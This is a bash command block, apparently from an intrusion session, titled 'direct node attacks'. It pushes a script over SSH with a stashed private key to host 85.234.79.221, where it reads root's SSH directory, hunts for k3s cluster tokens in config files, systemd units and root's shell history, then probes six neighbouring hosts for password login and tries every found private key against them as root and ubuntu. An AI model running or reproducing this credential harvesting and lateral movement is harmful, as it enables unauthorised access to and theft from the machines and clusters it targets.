echo "=== 221 direct node attacks ==="
cat > /tmp/r6.sh <<'RSH'
#!/bin/bash
echo "=== root ssh dir ==="
sudo ls -la /root/.ssh/ 2>/dev/null
echo "=== k3s token hunt ==="
sudo cat /etc/rancher/k3s/config.yaml 2>/dev/null; sudo ls -la /etc/rancher/k3s/ 2>/dev/null
sudo cat /etc/systemd/system/k3s-agent.service 2>/dev/null | grep -A3 Environment
sudo cat /var/lib/rancher/k3s/agent/etc/k3s-agent-load-balancer.json 2>/dev/null
sudo grep -rlE "K3S_TOKEN|K10[0-9a-f]" /etc/systemd/system/ /root/ /var/lib/rancher/k3s/agent/ 2>/dev/null | head -5
sudo grep -hoE "K10[0-9a-z:]+" /etc/systemd/system/k3s*.service /root/.bash_history 2>/dev/null | head -3
echo "=== ssh auth methods on rx nodes ==="
for ip in 31 87 103 109 184 233; do
  m=$(ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o PreferredAuthentications=password -o PubkeyAuthentication=no root@85.234.79.$ip true 2>&1 | head -1)
  echo "  .79.$ip: $m"
done
echo "=== key auth attempts ==="
for key in /home/ubuntu/.ssh/id_ed25519 /root/.ssh/id_ed25519 /root/.ssh/id_rsa; do
  sudo test -f $key || continue
  for ip in 31 87 103 109 184 233; do
    for u in root ubuntu; do
      r=$(sudo ssh -i $key -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=4 $u@85.234.79.$ip 'hostname' 2>&1 | tail -1)
      echo "  $key -> $u@.79.$ip: ${r:0:60}"
    done
  done
done
RSH
chmod +x /tmp/r6.sh
timeout 115 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/r6.sh 2>&1 | head -80
echo "=== B22DONE ==="
